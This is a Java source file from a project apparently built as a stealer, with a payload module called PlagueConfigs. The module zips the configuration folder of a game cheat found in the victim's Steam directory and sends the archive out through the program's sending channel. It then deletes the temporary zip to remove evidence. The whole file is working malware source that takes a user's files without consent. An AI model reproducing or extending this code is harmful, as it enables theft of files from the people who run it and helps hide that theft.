package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;
import org.zeroturnaround.zip.ZipUtil;

import java.io.File;
import java.util.Optional;

/**
 * @author Peter
 * @since 09/15/2022
 * Gets PlagueCheat's configs!
 */
public class PlagueConfigs implements PayloadExecutor {
    Main main = new Main();

    String path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\Plague";
    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofPlague.zip";

    @Override
    public void execute() throws Exception {
        ZipUtil.pack(new File(path), new File(zipPath));

        Optional<File> file = FileUtil.getFile(zipPath);
        file.ifPresent(main.theThing::send);

        deleteFileAfterSent();
    }

    public void deleteFileAfterSent() {
        File zipFile = new File(zipPath);

        zipFile.delete();
    }
}
